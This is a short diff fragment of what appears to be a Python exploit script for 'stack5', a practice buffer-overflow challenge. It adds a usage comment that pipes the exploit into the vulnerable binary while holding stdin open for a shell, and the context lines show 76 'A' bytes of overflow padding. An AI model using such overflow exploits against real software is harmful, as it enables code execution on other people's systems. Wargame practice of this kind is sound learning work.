@@ -1,3 +1,5 @@
+#usage : python stack5exp.py > a.txt;(cat a.txt;cat) | ./stack5
+
 import struct
 
 tampon= "A"*76
